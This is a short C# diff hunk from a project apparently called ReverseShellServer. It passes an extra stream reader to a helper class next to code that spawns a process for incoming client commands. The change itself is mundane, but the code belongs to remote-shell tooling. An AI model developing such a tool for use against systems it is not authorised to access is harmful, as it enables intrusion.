@@ -60,7 +60,7 @@ namespace ReverseShellServer
                 }
                 catch (Exception) { return; } // if no Client, don't continue 
 
-                tools = new ServerTools(binaryWriter, binaryReader, streamWriter);
+                tools = new ServerTools(binaryWriter, binaryReader, streamWriter, streamReader);
 
                 processCmd = new Process
                 {
